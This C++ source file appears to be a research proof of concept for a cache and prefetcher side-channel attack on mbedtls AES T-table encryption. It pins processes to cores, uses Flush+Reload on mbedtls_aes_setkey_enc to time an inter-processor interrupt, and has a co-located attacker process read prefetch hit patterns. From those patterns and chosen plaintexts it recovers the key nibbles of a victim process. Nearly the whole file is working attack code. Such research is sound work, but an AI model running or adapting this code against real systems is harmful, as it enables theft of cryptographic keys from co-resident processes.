#include <string>
#include <map>
#include <vector>
#include <iomanip>
#include <sstream>

#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <time.h>
#include <dlfcn.h>
#include <semaphore.h>
#include <linux/membarrier.h>
#include <sys/syscall.h>

#include "common_test.hh"
#include "nops.hh"
#include "semaphores.hh"
#include "cores.hh"
#include "LUTHypothesis.hh"
#include "cache_query.hh"

extern Mapping cache_pa;

#include <mbedtls/aes.h>

using std::string;
using std::map;
using std::vector;

#define PIPE_READ_END (0)
#define PIPE_WRITE_END (1)

//#define SLEEPER_START_DELAY (3800)
#define FNR_TARGET ((void*)(((uint8_t*)&mbedtls_aes_setkey_enc)))

// Controls whether traces (hit maps) are collected on the hardware (true)
// or previously recorded traces are loaded from a file (false).
#define COLLECT_TRACES_ANCHOR (true)
#define COLLECT_TRACES_DEPENDENT (true)

// padding/access functions
#include "aligned_code.hh"

/**
 * @brief      Parses the response array provided by the kernel module and
 *             stores the results in the given map structure. The keys of
 *             the map correspond to the distance of the hit relative to
 *             the attacker load, the values are counters (increased by 1
 *             every time a hit at the respective distance was observed.)
 *
 * @param      resultmap  The map, mapping distance -> number of
 *                        occurrences.
 * @param[in]  resp       The data structrue where the response of the
 *                        kernel module is stored
 */
void update_map(hit_map_t& resultmap, uint64_t cache_state) {
	size_t num_hits = __builtin_popcountll(cache_state);
	printf("state: %zu\n", cache_state);
	fflush(stdout);
	// only consider prefetching sequences containing 4 hits
	if (num_hits == 3 || num_hits == 4) {
		dist4_t distances = {0, 0, 0, DIST4_T_DUMMY};
		for (size_t clidx = 0, dist_ctr = 0; clidx < 8 * sizeof(cache_state); clidx++) {
			bool hit = (cache_state & (1ULL << clidx)) != 0;
			if (hit) {
				// subtract 16 because we start at base_addr+1024 (+16CL) to observe
				// negative distances as well.
				dist_t distance = clidx - 16;
				distances[dist_ctr++] = distance;
			}
		}
		resultmap[distances] += 1;
	}
}

/**
 * @brief      Converts a plaintext_t (i.e. array of raw bytes) into a
 *             string of hex digits.
 *
 * @param      plaintext  The plaintext
 *
 * @return     { description_of_the_return_value }
 */
string plaintext_to_string(plaintext_t const& plaintext, size_t n) {
	std::stringstream sstream;
	sstream << std::setfill('0') << std::setw(2) << std::hex;
	for (size_t i = 0; i < n; i++) {
		sstream << std::setw(2) << (int)plaintext[i];
	}
	return sstream.str();
}

/**
 * @brief      If a semaphore named `name` exists, unlink it. Otherwise, do
 *             nothing.
 *
 * @param[in]  name  The name of the semaphore to unlink.
 */
void unlink_semaphore_if_exists(string name) {
	// remove existing semaphores (if any)
	int err = sem_unlink(name.c_str());
	if(err) {
		if (errno == ENOENT) {
			printf("(info) semaphore %s does not exist, did not unlink.\n", name.c_str());
		} else {
			perror("sem_unlink 1 failed.");
			exit(1);
		}
	}
}

/**
 * @brief      Starts a victim process.
 *
 * @param      plaintext  The plaintext to provide to the victim process
 *
 * @return     The pid of the victim process
 */
pid_t start_victim(plaintext_t const& plaintext) {
	// start victim with plaintext as command line parameter
	string plaintext_str = plaintext_to_string(plaintext, 16);
	string victim_args[] = {"build/victim", plaintext_str};
	char* const victim_args_char[] = {&victim_args[0][0], &victim_args[1][0], NULL};
	fflush(stdout);
	pid_t pid = fork();
	switch(pid) {
		case 0: {
			// set up semaphore
			sem_t* sem_attacker_fork = sem_open(SEM_ATTACKER_FORK_NAME, O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO, 0);

			// pin forked process to victim core
			move_process_to_cpu(0, CPU_CORE_VICTIM);

			sem_post(sem_attacker_fork);

			int ret = execvp(victim_args[0].c_str(), victim_args_char);
			if (ret != 0) {
				perror("execvp failed");
				exit(1);
			}
			break;
		}
		case -1:
			perror("fork failed");
			exit(1);
			break;
		default:
			break;
	}
	return pid;
}

/**
 * @brief      Starts a "colocated" attacker process, i.e. an attacker
 *             process on the processor core where the victim runs.
 *
 * @param[in]  lut_i  The number of the lookup table that is currently
 *                    targeted.
 *
 * @return     Pair: `.first`: pid of the colocated attacker process.
 *             `.second`: Read end of a pipe to the colocated attacker
 *             process.
 */
pair<pid_t, int> start_attacker_colocated(uint8_t lut_i) {
	int pipefd_colo_to_main[2];
	pipe(pipefd_colo_to_main);
	fflush(stdout);
	pid_t pid = fork();
	switch(pid) {
		case 0: {
			close(pipefd_colo_to_main[PIPE_READ_END]);

			// pin forked process to victim core
			move_process_to_cpu(0, CPU_CORE_VICTIM);
			printf("[B] co-located attacker on %d\n", get_current_cpu_core());
			
			// set up semaphores
			sem_t* sem_attacker_prepare_colo = sem_open(SEM_ATTACKER_PREPARE_COLO_NAME, O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO, 0);
			sem_t* sem_attacker_probe = sem_open(SEM_ATTACKER_PROBE_NAME, O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO, 0);

			// set up cache query
			cache_query_setup();

			// sleep until the victim did relevant memory operations;
			// the other attacker process will then send an interrupt that
			// allows this process to be scheduled on the victim core.
			sem_post(sem_attacker_prepare_colo);
			sem_wait(sem_attacker_probe);

			// probing: perform a load request that (hopefully) picks up
			// the previous sequence. Note that we perform the first access
			// at the middle of the probe array (+1024) and not at the
			// beginning. We do this to be able to observe prefetching in
			// negative direction as well.
			switch (lut_i) {
				case 0:				
					access_FT0_0(cache_pa.base_addr + REGION_SIZE);
					break;
				case 1:
					access_FT1_0(cache_pa.base_addr + REGION_SIZE);
					break;
				case 2:
					access_FT2_0(cache_pa.base_addr + REGION_SIZE);
					break;
				case 3:
					access_FT3_0(cache_pa.base_addr + REGION_SIZE);
					break;
				default:
					assert(false);
					break;
			}

			print_hits();
			
			// report cache hits back to main process
			uint64_t cache_state = get_cache_state();
			write(pipefd_colo_to_main[PIPE_WRITE_END], &cache_state, sizeof(cache_state));
			close(pipefd_colo_to_main[PIPE_WRITE_END]);
			exit(0);
			break;
		}
		case -1:
			perror("fork failed (co-located attacker)");
			exit(1);
			break;
		default:
			close(pipefd_colo_to_main[PIPE_WRITE_END]);
			break;
	}
	return pair<pid_t, int> {pid, pipefd_colo_to_main[PIPE_READ_END]};
}

/**
 * @brief      Run an experiment, i.e. collect traces (hit maps). Starts a
 *             colocated attacker process and a victim process. Each
 *             repetition corresponds to one execution of the victim
 *             process.
 *
 * @param[in]  num_repetitions  The number of repetitions to perform
 * @param[in]  lut_i            The number of the lookup table to target
 * @param      plaintext        The plaintext to provide to the victim
 *                              process (chosen-plaintext)
 *
 * @return     The recorded traces (as a hit map). A hit map is a C++ map.
 *             It describes the prefetch behavior observed in the colocated
 *             attacker process. To trigger prefetching, the colocated
 *             process performs a memory access which is aligned with a
 *             load instruction in the victim process (or library). If the
 *             experiment is successful, the region-based prefetcher will
 *             load addresses in a certain distance from the initial
 *             attacker load. The distance depends on the access pattern
 *             that was previously observed in the victim process. This
 *             distance is the key of the map. The value of the map is a
 *             counter that specifies in how many experiment repetitions
 *             prefetching was observed at this particular distance.
 */
hit_map_t run_experiment(unsigned int num_repetitions, uint8_t lut_i, plaintext_t const& plaintext) {
	hit_map_t hit_map;

	// open the semaphores (for synchronization with the other attacker
	// process)
	unlink_semaphore_if_exists(SEM_ATTACKER_PREPARE_COLO_NAME);
	unlink_semaphore_if_exists(SEM_ATTACKER_PROBE_NAME);
	unlink_semaphore_if_exists(SEM_ATTACKER_FORK_NAME);
	sem_t* sem_attacker_prepare_colo = sem_open(SEM_ATTACKER_PREPARE_COLO_NAME, O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO, 0);
	sem_t* sem_attacker_probe = sem_open(SEM_ATTACKER_PROBE_NAME, O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO, 0);
	sem_t* sem_attacker_fork = sem_open(SEM_ATTACKER_FORK_NAME, O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO, 0);

	for (uint64_t repetition = 0; repetition < num_repetitions; repetition++) {
		// start other attacker process on victim core
		pair<pid_t, int> colocated_attacker = start_attacker_colocated(lut_i);
		pid_t const& colocated_attacker_pid = colocated_attacker.first;
		int const& colocated_attacker_pipefd_read_end = colocated_attacker.second;
		
		// wait for other attacker process to get ready
		sem_wait(sem_attacker_prepare_colo);

		// start victim and wait until fork() is done 
		pid_t victim_pid = start_victim(plaintext);
		sem_wait(sem_attacker_fork);

		// interrupt victim when a specific code cache line is loaded
		void* fnr_target = FNR_TARGET;
		flush(fnr_target);
		mfence();
		size_t fr_tries;
		for (fr_tries = 0; fr_tries < 40960; fr_tries++) {
			NOP1024
			
			uint64_t time = reload_flush_t(fnr_target);
			
			if (time < FNR_THRESHOLD) {
				break;
			}
		}
		printf("no. of f&r tries: %zu\n", fr_tries);

		// sleep some more cycles (fixed amount)
		//for (uint64_t tsc_start = rdtsc(); rdtsc() - tsc_start < SLEEPER_START_DELAY;);

		// wake up attacker on victim core
		sem_post(sem_attacker_probe);
		// issue inter-processor interrupt (IPI)
		syscall(__NR_membarrier, MEMBARRIER_CMD_GLOBAL, 0);
		// alternative way to trigger an interrupt: move the victim to
		// another core
		// move_process_to_cpu(victim_pid, CPU_CORE_UNRELATED);
		
		// wait for victim to exit
		waitpid(victim_pid, NULL, 0);
		
		// Retrieve cache hits from colocated attacker via unix pipe
		uint64_t cache_state;
		read(colocated_attacker_pipefd_read_end, &cache_state, sizeof(uint64_t));
		
		// close pipe and wait for colocated attacker to exit
		close(colocated_attacker_pipefd_read_end);
		waitpid(colocated_attacker_pid, NULL, 0);
	
		printf("Updating map, values (normalized):\n");
		for (size_t i = 0; i < sizeof(cache_state) * 8; i++) {
			bool hit = (cache_state & (1ULL << i)) != 0;
			if (hit) {
				printf("%zu, %zd\n", i, (ssize_t)i-16);
			}
		}
		update_map(hit_map, cache_state);

		printf("Map:\n");
		for (pair<const dist4_t, counter_t> const& p : hit_map) {
			printf("dist: %s, counter: %lu\n", LUTHypothesis::x4_to_str_human(p.first).c_str(), p.second);
		}
		fflush(stdout);
	}

	return hit_map;
}

int main(int argc, char* argv[]) {
	// enable ccr on victim core
	move_process_to_cpu(0, CPU_CORE_VICTIM);
	timing_init();

	// move attacker process to attacker core
	move_process_to_cpu(0, CPU_CORE_ATTACKER);
	// enable ccr on attacker core
	timing_init();

	printf("Timestamp (program start): %ld\n", time(NULL));

	plaintext_t plaintext {
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
	};

	// The attacker process knows the key just to provide a nicer output to
	// the user (so it can indicate whether the extracted key bits are
	// right or wrong). The attacker process does not use the key in any
	// other way.
	const aes_byte_t correct_key[] = {
		#include "key.hh"
	};

	// map the four lookup tables to the four key/plaintext positions that
	// target that table (in execution order). the first position in each
	// array is the "anchor" position, the other 3 positions are
	// "dependent" positions.
	vector<array<size_t, 4>> const aes_positions = {
		{ 0,  4,  8, 12}, // FT0
		{ 5,  9, 13,  1}, // FT1
		{10, 14,  2,  6}, // FT2
		{15,  3,  7, 11}  // FT3
	};

	// Set up a data structure to keep recoreded traces
	array<LUTHypothesis, 4> lut_byte_hyps = {
		LUTHypothesis { aes_positions[0] }, // FT0
		LUTHypothesis { aes_positions[1] }, // FT1
		LUTHypothesis { aes_positions[2] }, // FT2
		LUTHypothesis { aes_positions[3] }  // FT3
	};

	// To prevent the compiler from eliminating dead code (which in my
	// observation changes the microarchitectural behavior), I make the
	// debug break points dependent on a volatile variable.
	volatile bool always_true = true;

	// for each lookup table...
	for (size_t lut_i = 0; lut_i < 4; lut_i++) {
		printf("Timestamp (LUT %zu start): %ld\n", lut_i, time(NULL));
		
		LUTHypothesis& lut_byte_hyp = lut_byte_hyps[lut_i];
		
		// Begin with the "anchor byte" (0/5/10/15). Determine its position.
		size_t const& anchor_byte_pos = aes_positions[lut_i][0];

		fflush(stdout);

		#if COLLECT_TRACES_ANCHOR
			// Collect traces (and store them in hit maps) while varying the
			// plaintext byte at the anchor byte position (i.e. moving the
			// anchor hit position around in the lookup table). This allows us
			// to find the upper bits of the anchor byte later.
			
			for (aes_byte_t pt_byte = 0b0000; pt_byte <= 0b1111; pt_byte++) {
				plaintext[anchor_byte_pos] = (pt_byte << 4);
				printf("Collecting anchor traces for LUT %zu, PT pos %zu, value %.2x\n", lut_i, anchor_byte_pos, plaintext[anchor_byte_pos]);
				/*size_t map_idx =*/ lut_byte_hyp.add_map(
					HIT_MAP_ANCHOR, anchor_byte_pos, plaintext,
					run_experiment(15000, lut_i, plaintext)
				);

				// DEBUG
				// assert(map_idx >= 0);
				// fflush(stdout);
				// printf("Final map for pt_byte=%.2x:\n", (pt_byte << 4));
				// lut_byte_hyp.print_map(HIT_MAP_ANCHOR, map_idx);
				// fflush(stdout);
				// if(always_true && pt_byte==0b0011) break;
				// if(always_true)break;
			}

			fflush(stdout);

			// store a copy in a file
			lut_byte_hyp.dump_hit_maps_to_file(HIT_MAP_ANCHOR, "maps-LUT" + std::to_string(lut_i) + "-anchor.txt");
		#else
			// Read pre-recorded hit maps from a file
			lut_byte_hyp.restore_hit_maps_from_file(HIT_MAP_ANCHOR, "maps-LUT" + std::to_string(lut_i) + "-anchor.txt");
		#endif

		// DEBUG
		// if(always_true)break;

		// Evaluate the recorded traces to find the upper bits of the
		// anchor byte
		lut_byte_hyp.evaluate_maps_anchor();
		
		printf("Results after searching the anchor byte for LUT %zu:\n", lut_i);
		lut_byte_hyp.print_current_hyp_tabular(HIT_MAP_ANCHOR);
		lut_byte_hyp.print_current_hyp(HIT_MAP_ANCHOR, correct_key);
		printf("-----\n");
		fflush(stdout);

		// DEBUG
		// if(always_true)break;
				
		// Now proceed to find the non-anchor bytes (i.e., dependent bytes)
		// in the LUT.

		// precompute the plaintext byte values for the anchor byte to move
		// the anchor to specific positions within the LUT
		aes_byte_t current_anchor_byte_hypothesis = lut_byte_hyp.get_current_hypothesis_at_pos_idx(0);
		vector<aes_byte_t> anchor_byte_offsets { 6, 7, 8, 9 };
		vector<aes_byte_t> anchor_byte_pt_values;
		for (aes_byte_t const& anchor_byte_offset : anchor_byte_offsets) {
			anchor_byte_pt_values.push_back(current_anchor_byte_hypothesis ^ (anchor_byte_offset << 4));
		};
		
		#if COLLECT_TRACES_DEPENDENT
			// move the dependent bytes around and record traces ("dependent maps").
			// For each dependent byte...
			for (size_t dependent_byte_no = 1; dependent_byte_no < 4; dependent_byte_no++) {
				size_t const& dependent_byte_pos = aes_positions[lut_i][dependent_byte_no];

				// For each bit position of the dependent byte...
				for (size_t flipped_bit = 4; flipped_bit < 8; flipped_bit++) {
					// Flip bit
					plaintext[dependent_byte_pos] ^= (1 << flipped_bit);
					printf("Flipped bit %zu in PT byte %zu -> %.2x\n", flipped_bit, dependent_byte_pos, plaintext[dependent_byte_pos]);

					// Record traces
					for (aes_byte_t const& anchor_byte_pt_value : anchor_byte_pt_values) {
						printf("Collecting traces for LUT %zu, dependent byte pos %zu, flipped bit %zu -> %.2x, anchor PT value %.2x\n", lut_i, dependent_byte_pos, flipped_bit, plaintext[dependent_byte_pos], anchor_byte_pt_value);
						plaintext[anchor_byte_pos] = anchor_byte_pt_value;
						lut_byte_hyp.add_map(
							HIT_MAP_DEPENDENT, dependent_byte_pos, plaintext, run_experiment(15000, lut_i, plaintext)
						);
					}

					fflush(stdout);

					// Flip bit back to its initial state
					plaintext[dependent_byte_pos] ^= (1 << flipped_bit);
					printf("Flipped bit %zu in PT byte %zu -> %.2x\n", flipped_bit, dependent_byte_pos, plaintext[dependent_byte_pos]);
				}		
			}

			lut_byte_hyp.dump_hit_maps_to_file(HIT_MAP_DEPENDENT, "maps-LUT" + std::to_string(lut_i) + "-dependent.txt");
		#else
			lut_byte_hyp.restore_hit_maps_from_file(HIT_MAP_DEPENDENT, "maps-LUT" + std::to_string(lut_i) + "-dependent.txt");
		#endif

		lut_byte_hyp.evaluate_maps_dependent();

		printf("Results after searching the dependent bytes for LUT %zu:\n", lut_i);
		lut_byte_hyp.print_current_hyp_tabular(HIT_MAP_DEPENDENT);
		lut_byte_hyp.print_current_hyp(HIT_MAP_DEPENDENT, correct_key);
		fflush(stdout);

		puts("");

		// DEBUG (only find the first 2*4 key byte nibbles for now)
		// if(always_true && lut_i == 8)break;
	}

	// Print final summary at the end of the output.		
	printf(
		"================\n"
		" Final Summary: \n"
		"================\n"
	);
	for (size_t lut_i = 0; lut_i < lut_byte_hyps.size(); lut_i++) {
		printf("=== LUT %zu ===\n", lut_i);
		lut_byte_hyps[lut_i].print_current_hyp(HIT_MAP_DEPENDENT, correct_key);
	}
	
	printf("Timestamp (program end): %ld\n", time(NULL));
	
	return 0;
}
